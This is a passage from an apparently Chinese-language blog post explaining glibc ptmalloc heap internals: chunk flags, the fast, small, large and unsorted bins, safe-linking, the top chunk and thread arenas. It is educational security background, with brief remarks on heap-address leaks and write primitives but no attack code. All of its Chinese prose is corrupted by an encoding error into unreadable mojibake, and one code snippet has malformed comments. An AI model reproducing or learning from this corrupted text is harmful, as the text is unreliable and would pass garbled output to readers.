SIZE_SZ</code>çš„æ•´æ•°å€ã€‚è¯¥å­—æ®µçš„ä½ä¸‰ä¸ªæ¯”ç‰¹ä½å¯¹<code>chunk</code>çš„å¤§å°æ²¡æœ‰å½±å“ï¼Œå®ƒä»¬ä»é«˜åˆ°ä½åˆ†åˆ«è¡¨ç¤ºä¸ºï¼š<ul><li><code>NON_MAIN_ARENA</code>ï¼Œè®°å½•å½“å‰<code>chunk</code>æ˜¯å¦ä¸å±äºä¸»çº¿ç¨‹ï¼Œ1 è¡¨ç¤ºä¸å±äºï¼Œ0 è¡¨ç¤ºå±äºã€‚</li><li><code>IS_MAPPED</code>ï¼Œè®°å½•å½“å‰<code>chunk</code>æ˜¯å¦æ˜¯ç”±<code>mmap</code>åˆ†é…çš„ã€‚</li><li><code>PREV_INUSE</code>ï¼Œè®°å½•å‰ä¸€ä¸ª<code>chunk</code>å—æ˜¯å¦è¢«åˆ†é…ã€‚ä¸€èˆ¬æ¥è¯´ï¼Œå †ä¸­ç¬¬ä¸€ä¸ªè¢«åˆ†é…çš„å†…å­˜å—çš„<code>size</code>å­—æ®µçš„<code>P</code>ä½éƒ½ä¼šè¢«è®¾ç½®ä¸º 1ï¼Œä»¥ä¾¿äºé˜²æ­¢è®¿é—®å‰é¢çš„éæ³•å†…å­˜ã€‚å½“ä¸€ä¸ª<code>chunk</code>çš„<code>size</code>çš„<code>P</code>ä½ä¸º0æ—¶ï¼Œæˆ‘ä»¬èƒ½é€šè¿‡<code>prev_size</code>å­—æ®µæ¥è·å–ä¸Šä¸€ä¸ª<code>chunk</code>çš„å¤§å°ä»¥åŠåœ°å€ã€‚è¿™ä¹Ÿæ–¹ä¾¿è¿›è¡Œç©ºé—²<code>chunk</code>ä¹‹é—´çš„åˆå¹¶ã€‚</li></ul></li><li><code>fd</code>ï¼Œ<code>bk</code>ã€‚<code>chunk</code>å¤„äºåˆ†é…çŠ¶æ€æ—¶ï¼Œä»<code>fd</code>å­—æ®µå¼€å§‹æ˜¯ç”¨æˆ·çš„æ•°æ®ã€‚<code>chunk</code>ç©ºé—²æ—¶ï¼Œä¼šè¢«æ·»åŠ åˆ°å¯¹åº”çš„ç©ºé—²ç®¡ç†é“¾è¡¨ä¸­ï¼Œå…¶å­—æ®µçš„å«ä¹‰å¦‚ä¸‹<ul><li><code>fd</code>æŒ‡å‘ä¸‹ä¸€ä¸ªï¼ˆéç‰©ç†ç›¸é‚»ï¼‰ç©ºé—²çš„<code>chunk</code></li><li><code>bk</code>æŒ‡å‘ä¸Šä¸€ä¸ªï¼ˆéç‰©ç†ç›¸é‚»ï¼‰ç©ºé—²çš„<code>chunk</code></li></ul></li></ul><p>é€šè¿‡<code>fd</code>å’Œ<code>bk</code>å¯ä»¥å°†ç©ºé—²çš„<code>chunk</code>å—åŠ å…¥åˆ°ç©ºé—²çš„<code>chunk</code>å—é“¾è¡¨è¿›è¡Œç»Ÿä¸€ç®¡ç†ã€‚</p><ul><li><code>fd_nextsize</code>ï¼Œ<code>bk_nextsize</code>ï¼Œä¹Ÿæ˜¯åªæœ‰<code>chunk</code>ç©ºé—²çš„æ—¶å€™æ‰ä½¿ç”¨ï¼Œä¸è¿‡å…¶ç”¨äºè¾ƒå¤§çš„<code>chunk</code>ï¼ˆlarge chunkï¼‰ã€‚<ul><li><code>fd_nextsize</code>ï¼šæŒ‡å‘å‰ä¸€ä¸ªä¸å½“å‰<code>chunk</code>å¤§å°ä¸åŒçš„ç¬¬ä¸€ä¸ªç©ºé—²å—ï¼Œä¸åŒ…å«<code>bin</code>çš„å¤´æŒ‡é’ˆã€‚</li><li><code>bk_nextsize</code>ï¼šæŒ‡å‘åä¸€ä¸ªä¸å½“å‰<code>chunk</code>å¤§å°ä¸åŒçš„ç¬¬ä¸€ä¸ªç©ºé—²å—ï¼Œä¸åŒ…å«<code>bin</code>çš„å¤´æŒ‡é’ˆã€‚</li><li>ä¸€èˆ¬ç©ºé—²çš„<code>large chunk</code>åœ¨<code>fd</code>çš„éå†é¡ºåºä¸­ï¼ŒæŒ‰ç…§ç”±å¤§åˆ°å°çš„é¡ºåºæ’åˆ—ã€‚è¿™æ ·åšå¯ä»¥é¿å…åœ¨å¯»æ‰¾åˆé€‚<code>chunk</code>æ—¶æŒ¨ä¸ªéå†ã€‚</li></ul></li></ul><p><code>chunk</code>çš„ç»“æ„</p><p><img src="/assets/Pasted%20image%2020241119212358.png"></p><h3 id="bins"><a href="#bins" class="headerlink" title="bins"></a>bins</h3><p>ç”¨æˆ·é‡Šæ”¾æ‰çš„<code>chunk</code>ä¸ä¼šé©¬ä¸Šå½’è¿˜ç»™ç³»ç»Ÿï¼Œptmalloc ä¼šç»Ÿä¸€ç®¡ç†<code>heap</code>å’Œ<code>mmap</code>æ˜ å°„åŒºåŸŸä¸­çš„ç©ºé—²çš„<code>chunk</code>ã€‚å½“ç”¨æˆ·å†ä¸€æ¬¡è¯·æ±‚åˆ†é…å†…å­˜æ—¶ï¼Œptmalloc åˆ†é…å™¨ä¼šè¯•å›¾åœ¨ç©ºé—²çš„<code>chunk</code>ä¸­æŒ‘é€‰ä¸€å—åˆé€‚çš„ç»™ç”¨æˆ·ã€‚è¿™ä¹Ÿå¯ä»¥é¿å…é¢‘ç¹çš„ç³»ç»Ÿè°ƒç”¨ï¼Œé™ä½å†…å­˜åˆ†é…çš„å¼€é”€ã€‚</p><p>åœ¨å…·ä½“çš„å®ç°ä¸­ï¼Œptmalloc é‡‡ç”¨åˆ†ç®±å¼æ–¹æ³•å¯¹ç©ºé—²çš„<code>chunk</code>è¿›è¡Œç®¡ç†ã€‚é¦–å…ˆï¼Œå®ƒä¼šæ ¹æ®ç©ºé—²çš„<code>chunk</code>çš„å¤§å°ä»¥åŠä½¿ç”¨çŠ¶æ€å°†<code>chunk</code>åˆæ­¥åˆ†ä¸º4ç±»ï¼š<code>fast bins</code>ï¼Œ<code>small bins</code>ï¼Œ<code>large bins</code>ï¼Œ<code>unsorted bin</code>ã€‚å¯¹äº libc2.27 åŠä»¥ä¸Šç‰ˆæœ¬è¿˜æœ‰<code>tcache</code>ã€‚</p><p><strong>æ¦‚è¿°</strong></p><p>å¯¹äº<code>small bins</code>ï¼Œ<code>large bins</code>ï¼Œ<code>unsorted bin</code>æ¥è¯´ï¼Œptmalloc å°†å®ƒä»¬ç»´æŠ¤åœ¨ä¸€ä¸ª<code>bins</code>æ•°ç»„ä¸­ã€‚è¿™äº›<code>bin</code>å¯¹åº”çš„æ•°æ®ç»“æ„åœ¨<code>malloc_state</code>ä¸­ï¼Œå¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> NBINS 128</span><br><span class="hljs-comment">/* Normal bins packed as described above */</span><br>  mchunkptr bins[NBINS * <span class="hljs-number">2</span> - <span class="hljs-number">2</span>];<br></code></pre></td></tr></table></figure><p><code>bins</code>æ•°ç»„å®é™…ä¸Šå¯ä»¥çœ‹åšæ˜¯ä»¥<code>chunk</code>ä¸ºå•ä½ï¼Œåªä¸è¿‡é‡‡ç”¨ç©ºé—´å¤ç”¨ç­–ç•¥ï¼Œå› ä¸ºå®é™…ç”¨åˆ°çš„åªæœ‰<code>fd</code>å’Œ<code>bk</code>ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* addressing -- note that bin_at(0) does not exist */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> bin_at(m, i) \</span><br><span class="hljs-meta">Â Â (mbinptr) (((charÂ *) &amp;((m)-&gt;bins[((i) - 1) * 2]))Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â  \</span><br><span class="hljs-meta">Â Â Â Â Â Â Â Â Â Â Â Â Â - offsetof (structÂ malloc_chunk, fd))</span><br></code></pre></td></tr></table></figure><p><img src="/../assets/Pasted%20image%2020241105161925.png"></p><p>ç”±äºæ˜¯åŒé“¾è¡¨ç»“æ„<code>bins</code>æ•°ç»„æ¯è¿ç»­ä¸¤ä¸ª<code>chunk</code>æŒ‡é’ˆç»´æŠ¤ä¸€ä¸ª<code>bin</code>ï¼ˆå³<code>fd</code>å’Œ<code>bk</code>ï¼‰ï¼Œå…¶ç»“æ„å¦‚ä¸‹å›¾æ‰€ç¤ºï¼ˆ64ä½ï¼‰ã€‚å…¶ä¸­ <code>small bins</code>ä¸­<code>chunk</code>å¤§å°å·²ç»™å‡ºã€‚<code>large bins</code>çš„æ¯ä¸ª<code>bin</code>ä¸­çš„<code>chunk</code>å¤§å°åœ¨ä¸€ä¸ªèŒƒå›´å†…ã€‚</p><p><img src="/../assets/Pasted%20image%2020241105165455.png"><br><code>lareg bin</code>çš„<code>chunk</code>èŒƒå›´å¦‚ä¸‹ï¼š</p><p>å¤§äº<code>0x400</code>çš„<code>chunk</code>å°±ä¼šæ”¾åˆ°<code>large bin</code>ä¸­ã€‚</p><p>å¯¹äº<code>fast bin</code>ï¼Œåœ¨<code>malloc_state</code>åˆå•ç‹¬å®šä¹‰äº†ä¸€ä¸ª<code>fastbinsY</code>çš„ç»“æ„ç»´æŠ¤ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_chunk</span> *<span class="hljs-title">mfastbinptr</span>;</span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">/* Fastbins */</span><br>mfastbinptr fastbinY[ NFASBINS ];<br>*/<br></code></pre></td></tr></table></figure><p>ç”±äº<code>fast bin</code>ä¸ºå•é“¾è¡¨ç»“æ„ï¼Œå› æ­¤æ•°ç»„ä¸­ç¬¬ä¸€ä¸ªæŒ‡é’ˆå°±å¯ä»¥ç»´æŠ¤ä¸€ä¸ª<code>bin</code>ã€‚ç»“æ„å¦‚å›¾æ‰€ç¤ºï¼š</p><p><img src="/../assets/Pasted%20image%2020241105171119.png"></p><p><strong>Fast Bin</strong></p><p>ä¸ºäº†é¿å…å¤§éƒ¨åˆ†æ—¶é—´èŠ±åœ¨äº†åˆå¹¶ã€åˆ†å‰²ä»¥åŠä¸­é—´æ£€æŸ¥çš„è¿‡ç¨‹ä¸­å½±å“æ•ˆç‡ï¼Œå› æ­¤ ptmalloc ä¸­ä¸“é—¨è®¾è®¡äº†<code>fast bin</code>ã€‚</p><p><code>fast bin</code>é‡‡ç”¨å•é“¾è¡¨å½¢å¼ï¼Œç»“æ„å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š</p><p><img src="/assets/Pasted%20image%2020241120082430.png"></p><p><code>fast bin</code>æœ‰å¦‚ä¸‹æ€§è´¨ï¼š</p><ul><li>ç”±äºé‡‡ç”¨å•é“¾è¡¨ç»“æ„ï¼Œ<code>fast bin</code>é‡‡å– LIFOï¼ˆåè¿›å…ˆå‡ºï¼‰ç­–ç•¥ã€‚</li><li>æ¯ä¸ª<code>fast bin</code>ä¸­ç»´æŠ¤çš„<code>chunk</code>å¤§å°ç¡®å®šï¼Œå¹¶ä¸”<code>fast bin</code>ç»´æŠ¤çš„æœ€å¤§çš„<code>chunk</code>ä¸º 128 å­—èŠ‚ï¼ˆ64ä½ï¼‰ï¼Œå› æ­¤ä¸è¶…è¿‡ 0x80ï¼ˆchunkå¤§å°ï¼‰çš„å†…å­˜é‡Šæ”¾ä¼šè¿›å…¥<code>fast bin</code>ã€‚</li><li><code>fast bin</code>èŒƒå›´çš„<code>chunk</code>ä¸‹ä¸€ä¸ªç›¸é‚»<code>chunk</code>çš„<code>PREV_INUSE</code>å§‹ç»ˆè¢«ç½®ä¸º1ã€‚å› æ­¤å®ƒä»¬ä¸ä¼šå’Œå…¶å®ƒè¢«é‡Šæ”¾çš„<code>chunk</code>åˆå¹¶ã€‚é™¤éè°ƒç”¨<code>malloc_consolidate</code>å‡½æ•°ã€‚</li></ul><p>å®‰å…¨æ£€æŸ¥ï¼š</p><ul><li><code>size</code>ï¼šåœ¨<code>malloc()</code>å‡½æ•°åˆ†é…<code>fastbin size</code>èŒƒå›´çš„<code>chunk</code>æ—¶ï¼Œè‹¥æ˜¯å¯¹åº”çš„<code>fastbin</code>ä¸­æœ‰ç©ºé—²<code>chunk</code>ï¼Œåœ¨å–å‡ºå‰ä¼šæ£€æŸ¥å…¶<code>size</code>åŸŸä¸å¯¹åº”ä¸‹æ ‡æ˜¯å¦ä¸€è‡´ï¼Œä¸ä¼šæ£€æŸ¥æ ‡å¿—ä½ï¼Œè‹¥å¦ä¾¿ä¼šè§¦å‘<code>abort</code>ã€‚</li><li><code>double free</code>ï¼š åœ¨<code>free()</code>å‡½æ•°ä¸­ä¼šå¯¹<code>fast bin</code>é“¾è¡¨çš„å¤´ç»“ç‚¹è¿›è¡Œæ£€æŸ¥ï¼Œè‹¥å°†è¦è¢«æ”¾å…¥<code>fast bin</code>ä¸­çš„<code>chunk</code>ä¸å¯¹åº”ä¸‹æ ‡çš„é“¾è¡¨çš„å¤´ç»“ç‚¹ä¸ºåŒä¸€<code>chunk</code>ï¼Œåˆ™ä¼šè§¦å‘<code>abort</code>ã€‚</li><li>Safe linking æœºåˆ¶ï¼ˆonly glibc2.32 and upï¼‰ï¼šè‡ª glibc 2.32 èµ·å¼•å…¥äº† safe-linking æœºåˆ¶ï¼Œå…¶æ ¸å¿ƒæ€æƒ³æ˜¯åœ¨é“¾è¡¨ä¸Šçš„<code>chunk</code>ä¸­å¹¶ä¸ç›´æ¥å­˜æ”¾å…¶æ‰€è¿æ¥çš„ä¸‹ä¸€ä¸ª<code>chunk</code>çš„åœ°å€ï¼Œè€Œæ˜¯å­˜æ”¾ä¸‹ä¸€ä¸ª<code>chunk</code>çš„åœ°å€ä¸ã€<code>fd</code>æŒ‡é’ˆè‡ªèº«åœ°å€å³ç§» 12 ä½ã€‘æ‰€å¼‚æˆ–å¾—çš„å€¼ï¼Œä½¿å¾—æ”»å‡»è€…åœ¨å¾—çŸ¥<code>chunk</code>çš„åœ°å€ä¹‹å‰æ— æ³•ç›´æ¥åˆ©ç”¨å…¶æ„é€ ä»»æ„åœ°å€å†™ã€‚</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> PROTECT_PTR(pos, ptr) \</span><br><span class="hljs-meta">Â Â ((__typeof (ptr)) ((((size_t) pos) &gt;&gt; 12) ^ ((size_t) ptr)))</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> REVEAL_PTR(ptr)Â  PROTECT_PTR (&amp;ptr, ptr)</span><br></code></pre></td></tr></table></figure><p>éœ€è¦æ³¨æ„çš„æ˜¯<code>fastbin</code>çš„å…¥å£èŠ‚ç‚¹å­˜æ”¾çš„ä»æ˜¯æœªç»å¼‚æˆ–çš„<code>chunk</code>åœ°å€ã€‚</p><p>å¦å¤–ç¬¬ä¸€ä¸ªåŠ å…¥<code>fast bin</code>çš„<code>chunk</code>çš„<code>fd</code>å­—æ®µå¯ä»¥æ³„éœ²å †åœ°å€ï¼ˆå³ç§» 12 ä½ï¼‰ã€‚</p><p><strong>Small Bin</strong></p><p><code>small bin</code>é‡‡ç”¨åŒå‘é“¾è¡¨ï¼Œç»“æ„å¦‚ä¸‹å›¾æ‰€ç¤ºã€‚</p><p><img src="/assets/Pasted%20image%2020241120084426.png"></p><p><code>small bin</code>æœ‰å¦‚ä¸‹æ€§è´¨ï¼š</p><ul><li><code>small bins</code>ä¸­æ¯ä¸ª<code>bin</code>å¯¹åº”çš„é“¾è¡¨é‡‡ç”¨ FIFO çš„è§„åˆ™ã€‚</li><li>æ¯ä¸ª<code>small bin</code>ç»´æŠ¤çš„<code>chunk</code>å¤§å°ç¡®å®šï¼Œå¹¶ä¸”<code>small bin</code>ç»´æŠ¤çš„æœ€å¤§çš„<code>chunk</code>ä¸º1008å­—èŠ‚ï¼ˆ64ä½ï¼‰ï¼Œå³ 0x3f0 çš„<code>chunk</code>å¤§å°ã€‚</li></ul><p><strong>Large Bin</strong></p><p><code>large bins</code>ä¸­ä¸€å…±åŒ…æ‹¬64ä¸ª<code>bin</code>ï¼Œæ¯ä¸ª<code>bin</code>ä¸­çš„<code>chunk</code>çš„å¤§å°ä¸ä¸€è‡´ï¼Œè€Œæ˜¯å¤„äºä¸€å®šåŒºé—´èŒƒå›´å†…ã€‚<code>large bin</code>çš„ç»“æ„å¦‚ä¸‹ï¼š</p><p><img src="/../assets/Pasted%20image%2020241105173944.png"></p><p>å…³äº<code>fd_nextsize</code>å’Œ<code>bk_nextsize</code>çš„æœºåˆ¶ï¼Œè¿™é‡Œä»¥<code>fd_nextsize</code>ä¸ºä¾‹ï¼š</p><ul><li><code>fd_nextsize</code>å’Œ<code>bk_nextsize</code>ä¸<code>bins</code>æ•°ç»„æ²¡æœ‰è¿æ¥å…³ç³»ï¼ˆè¿™å°±è§£é‡Šäº†ä¸ºä»€ä¹ˆ<code>bins</code>ä¸Šæ²¡æœ‰ä½“ç°<code>fd_nextsize</code>å’Œ<code>bk_nextsize</code>ç»“æ„ï¼‰ã€‚</li><li><code>large bin</code>é‡Œçš„<code>chunk</code>åœ¨<code>fd</code>æŒ‡é’ˆæŒ‡å‘çš„æ–¹å‘ä¸ŠæŒ‰ç…§<code>chunk</code>å¤§å°é™åºæ’åºã€‚</li><li>å½“<code>large bin</code>é‡Œæœ‰ä¸€ä¸ª<code>chunk</code>æ—¶ï¼Œ<code>fd_nextsize</code>å’Œ<code>bk_nextsize</code>æŒ‡å‘è‡ªå·±ï¼ˆå¦‚ä¸Šé¢<code>large bin</code>çš„ç»“æ„å›¾æ‰€ç¤ºï¼‰ã€‚</li><li>å½“<code>large bin</code>é‡ŒåŒä¸€ä¸ªå¤§å°çš„<code>chunk</code>æœ‰å¤šä¸ªæ—¶ï¼Œåªæœ‰ç›¸åŒå¤§å°<code>chunk</code>ä¸­çš„ç¬¬ä¸€ä¸ªçš„<code>fd_nextsize</code>å’Œ<code>bk_nextsize</code>æŒ‡é’ˆæœ‰æ•ˆï¼Œå…¶ä½™çš„<code>chunk</code>çš„<code>fd_nextsize</code>å’Œ<code>bk_nextsize</code>è®¾ä¸º<code>NULL</code>ã€‚</li></ul><p><img src="/../assets/Pasted%20image%2020241105174727.png"></p><ul><li><code>large bin</code>ä¸­æœ‰å¤šä¸ªä¸åŒå¤§å°çš„<code>chunk</code>æ—¶<code>fd_nextsize</code>è¿æ¥æ¯”å®ƒå°çš„ç¬¬ä¸€ä¸ª<code>chunk</code>ï¼Œ<code>bk_nextsize</code>å°±æ˜¯æŠŠ<code>fd_nextsize</code>åè¿‡æ¥è¿åˆ°å¯¹åº”ç»“æ„ä¸Šã€‚</li></ul><p><img src="/../assets/Pasted%20image%2020241105174830.png"></p><ul><li><code>large bin</code>æœ€å°çš„ä¸€ç»„Â <code>chunk</code>Â ä¸­çš„ç¬¬ä¸€ä¸ªÂ <code>chunk</code>Â çš„Â <code>fd_nextsize</code>Â è¿æ¥çš„æ˜¯æœ€å¤§çš„Â <code>chunk</code>ï¼Œæœ€å¤§çš„Â <code>chunk</code>Â çš„Â <code>bk_nextsize</code>Â ç›¸åã€‚</li></ul><p><img src="/../assets/Pasted%20image%2020241105174844.png"></p><p><strong>Unsorted Bin</strong></p><p><code>unsorted bin</code>å¯ä»¥è§†ä¸ºç©ºé—²<code>chunk</code>å›å½’å…¶æ‰€å±<code>bin</code>ä¹‹å‰çš„ç¼“å†²åŒºã€‚åƒ<code>small bin</code>ä¸€æ ·é‡‡ç”¨åŒå‘é“¾è¡¨ç»´æŠ¤ã€‚<code>chunk</code>å¤§å°ä¹±åºã€‚</p><h3 id="Top-chunk"><a href="#Top-chunk" class="headerlink" title="Top chunk"></a>Top chunk</h3><p>ç¨‹åºç¬¬ä¸€æ¬¡è¿›è¡Œ<code>malloc</code>çš„æ—¶å€™ï¼Œ<code>heap</code>ä¼šè¢«åˆ†ä¸ºä¸¤å—ï¼Œä¸€å—ç»™ç”¨æˆ·ï¼Œå‰©ä¸‹çš„é‚£å—å°±æ˜¯<code>top chunk</code>ã€‚å…¶å®ï¼Œæ‰€è°“çš„<code>top chunk</code>å°±æ˜¯å¤„äºå½“å‰å †çš„ç‰©ç†åœ°å€æœ€é«˜çš„<code>chunk</code>ã€‚è¿™ä¸ª<code>chunk</code>ä¸å±äºä»»ä½•ä¸€ä¸ª<code>bin</code>ï¼Œå®ƒçš„ä½œç”¨åœ¨äºå½“æ‰€æœ‰çš„<code>bin</code>éƒ½æ— æ³•æ»¡è¶³ç”¨æˆ·è¯·æ±‚çš„å¤§å°æ—¶ï¼Œå¦‚æœå…¶å¤§å°ä¸å°äºæŒ‡å®šçš„å¤§å°ï¼Œå°±è¿›è¡Œåˆ†é…ï¼Œå¹¶å°†å‰©ä¸‹çš„éƒ¨åˆ†ä½œä¸ºæ–°çš„<code>top chunk</code>ã€‚å¦åˆ™ï¼Œå°±å¯¹<code>heap</code>è¿›è¡Œæ‰©å±•åå†è¿›è¡Œåˆ†é…ã€‚åœ¨<code>main_arena</code>ä¸­é€šè¿‡<code>sbrk</code>æ‰©å±•<code>heap</code>ï¼Œè€Œåœ¨<code>threadarena</code>ä¸­é€šè¿‡<code>mmap</code>åˆ†é…æ–°çš„heapã€‚</p><p>éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œ<code>top chunk</code>çš„<code>prev_inuse</code>æ¯”ç‰¹ä½å§‹ç»ˆä¸º1ï¼Œå¦åˆ™å…¶å‰é¢çš„<code>chunk</code>å°±ä¼šè¢«åˆå¹¶åˆ°<code>top chunk</code>ä¸­ã€‚</p><h3 id="last-remainder"><a href="#last-remainder" class="headerlink" title="last remainder"></a>last remainder</h3><p>åœ¨ç”¨æˆ·ä½¿ç”¨<code>malloc</code>è¯·æ±‚åˆ†é…å†…å­˜æ—¶ï¼Œptmalloc2 æ‰¾åˆ°çš„<code>chunk</code>å¯èƒ½å¹¶ä¸å’Œç”³è¯·çš„å†…å­˜å¤§å°ä¸€è‡´ï¼Œè¿™æ—¶å€™å°±å°†å‰©ä½™éƒ¨åˆ†ç§°ä¹‹ä¸º<code>last remainder chunk</code>ï¼Œ<code>unsortbin</code>ä¹Ÿä¼šå­˜è¿™ä¸€å—ã€‚<code>top chunk</code>åˆ†å‰²å‰©ä¸‹çš„éƒ¨åˆ†ä¸ä¼šä½œä¸º<code>last_remainder</code>ã€‚</p><p>Mmaped chunk</p><ul><li><p>å½“éœ€è¦åˆ†é…çš„chunkè¶³å¤Ÿå¤§ï¼Œè€Œä¸”fast binså’Œbinséƒ½ä¸èƒ½æ»¡è¶³è¦æ±‚ï¼Œç”šè‡³top chunkæœ¬èº«ä¹Ÿä¸èƒ½æ»¡è¶³åˆ†é…éœ€æ±‚æ—¶ï¼Œptmallocä¼šä½¿ç”¨mmapæ¥ç›´æ¥ä½¿ç”¨å†…å­˜æ˜ å°„æ¥å°†é¡µæ˜ å°„åˆ°è¿›ç¨‹ç©ºé—´ã€‚</p></li><li><p>è¿™æ ·åˆ†é…çš„chunkåœ¨è¢«freeæ—¶å°†ç›´æ¥è§£é™¤æ˜ å°„ï¼Œäºæ˜¯å°±å°†å†…å­˜å½’è¿˜ç»™äº†æ“ä½œç³»ç»Ÿï¼Œå†æ¬¡å¯¹è¿™æ ·çš„å†…å­˜åŒºçš„å¼•ç”¨ï¼ˆUAFï¼‰å°†å¯¼è‡´segmentation faulté”™è¯¯ã€‚</p></li><li><p>Main_arenaæœ‰ä¸ªmmap thresholdåˆ†é…é˜ˆå€¼ï¼Œåˆå§‹é»˜è®¤ä¸º128KBã€‚è‹¥è¯·æ±‚åˆ†é…å°äºé˜ˆå€¼ï¼Œè€Œå½“å‰heapç©ºé—´ä¸å¤Ÿï¼Œåˆ™ç”¨sbrk()å¢å¤§heapã€‚å¦‚æœè¯·æ±‚è¶…è¿‡é˜ˆå€¼ï¼Œæˆ–è€…sbrk()å¤±è´¥äº†ï¼Œå°±ç”¨mmapæ˜ å°„ä¸€å—å†…å­˜ã€‚</p></li><li><p>Mmapåˆ†é…é˜ˆå€¼åŠ¨æ€è°ƒæ•´æœºåˆ¶ã€‚</p></li></ul><h2 id="threads-arena"><a href="#threads-arena" class="headerlink" title="threads arena"></a>threads arena</h2><ul><li>æ¯ä¸ªè¿›ç¨‹åªæœ‰ä¸€ä¸ªä¸»åˆ†é…åŒº(main_arena)ï¼Œå¯èƒ½å­˜åœ¨å¤šä¸ªéä¸»åˆ†é…åŒº(non_main_arena)ï¼š</li></ul><p>Â - x86: <code>2*number of cores + 1</code></p><p>Â - x64: <code>8*number of cores + 1</code></p><ul><li><p><code>main_arena</code>ä½¿ç”¨<code>brk</code>å’Œ<code>mmap</code>ç”³è¯·è™šæ‹Ÿå†…å­˜</p><ul><li><code>mmap</code>åˆ†é…çš„å†…å­˜ä¸€å¾‹é€šè¿‡<code>munmap</code>è¿”è¿˜</li><li>åªæœ‰ä¸€ä¸ªheap</li></ul></li><li><p><code>non_main_arena</code>åªèƒ½ç”¨<code>mmap</code></p><ul><li>æ¯æ¬¡ç”¨<code>mmap</code>å‘ç³»ç»Ÿæ‰¹å‘<code>HEAP_MAX_SIZE</code>(32ä½1MB,64ä½64MB)ï¼Œå¯¹è±¡è¯·æ±‚æ—¶å†é›¶å”®</li><li>å½“å‰<code>heap</code>ä¸å¤Ÿç”¨ï¼Œ<code>mmap</code>å†æ¬¡ç”³è¯·<code>heap</code>ï¼Œæ‰€ä»¥å¯ä»¥åŒ…å«å¤šä¸ª<code>heaps</code></li></ul></li></ul><h3 id="åˆ†é…ç­–ç•¥"><a href="#åˆ†é…ç­–ç•¥" class="headerlink" title="åˆ†é…ç­–ç•¥"></a>åˆ†é…ç­–ç•¥</h3><p>å‡è®¾æœ‰å¦‚ä¸‹æƒ…å¢ƒï¼šä¸€å°åªå«æœ‰ä¸€ä¸ªå¤„ç†å™¨æ ¸å¿ƒçš„PCæœºå®‰è£…æœ‰32ä½æ“ä½œç³»ç»Ÿï¼Œå…¶ä¸Šè¿è¡Œäº†ä¸€ä¸ªå¤šçº¿ç¨‹åº”ç”¨ç¨‹åºï¼Œå…±å«æœ‰4ä¸ªçº¿ç¨‹â€”â€”ä¸»çº¿ç¨‹å’Œä¸‰ä¸ªç”¨æˆ·çº¿ç¨‹ã€‚æ˜¾ç„¶çº¿ç¨‹ä¸ªæ•°å¤§äºç³»ç»Ÿèƒ½ç»´æŠ¤çš„æœ€å¤§arenaä¸ªæ•°ï¼ˆ2* æ ¸å¿ƒæ•° + 1&#x3D; 3ï¼‰ï¼Œé‚£ä¹ˆæ­¤æ—¶glibc mallocå°±éœ€è¦ç¡®ä¿è¿™4ä¸ªçº¿ç¨‹èƒ½å¤Ÿæ­£ç¡®åœ°å…±äº«è¿™3ä¸ªarenaï¼Œé‚£ä¹ˆå®ƒæ˜¯å¦‚ä½•å®ç°çš„å‘¢ï¼Ÿ  </p><p>å½“ä¸»çº¿ç¨‹é¦–æ¬¡è°ƒç”¨mallocçš„æ—¶å€™ï¼Œglibc mallocä¼šç›´æ¥ä¸ºå®ƒåˆ†é…ä¸€ä¸ªmain arenaï¼Œè€Œä¸éœ€è¦ä»»ä½•é™„åŠ æ¡ä»¶ã€‚</p><p>å½“ç”¨æˆ·çº¿ç¨‹1å’Œç”¨æˆ·çº¿ç¨‹2é¦–æ¬¡è°ƒç”¨mallocçš„æ—¶å€™ï¼Œglibc mallocä¼šåˆ†åˆ«ä¸ºæ¯ä¸ªç”¨æˆ·çº¿ç¨‹åˆ›å»ºä¸€ä¸ªæ–°çš„thread arenaã€‚æ­¤æ—¶ï¼Œå„ä¸ªçº¿ç¨‹ä¸arenaæ˜¯ä¸€ä¸€å¯¹åº”çš„ã€‚ä½†æ˜¯ï¼Œå½“ç”¨æˆ·çº¿ç¨‹3è°ƒç”¨mallocçš„æ—¶å€™ï¼Œå°±å‡ºç°é—®é¢˜äº†ã€‚å› ä¸ºæ­¤æ—¶glibc mallocèƒ½ç»´æŠ¤çš„arenaä¸ªæ•°å·²ç»è¾¾åˆ°ä¸Šé™ï¼Œæ— æ³•å†ä¸ºçº¿ç¨‹3åˆ†é…æ–°çš„arenaäº†ï¼Œé‚£ä¹ˆå°±éœ€è¦é‡å¤ä½¿ç”¨å·²ç»åˆ†é…å¥½çš„3ä¸ªarenaä¸­çš„ä¸€ä¸ª(main arena, arena 1æˆ–è€…arena 2)ã€‚é‚£ä¹ˆè¯¥é€‰æ‹©å“ªä¸ªarenaè¿›è¡Œé‡å¤åˆ©ç”¨å‘¢ï¼Ÿ</p><p>1)é¦–å…ˆï¼Œglibc mallocå¾ªç¯éå†æ‰€æœ‰å¯ç”¨çš„arenasï¼Œåœ¨éå†çš„è¿‡ç¨‹ä¸­ï¼Œå®ƒä¼šå°è¯•lockè¯¥arenaã€‚å¦‚æœæˆåŠŸlock(è¯¥arenaå½“å‰å¯¹åº”çš„çº¿ç¨‹å¹¶æœªä½¿ç”¨å †å†…å­˜åˆ™è¡¨ç¤ºå¯lock)ï¼Œæ¯”å¦‚å°†main arenaæˆåŠŸlockä½ï¼Œé‚£ä¹ˆå°±å°†main 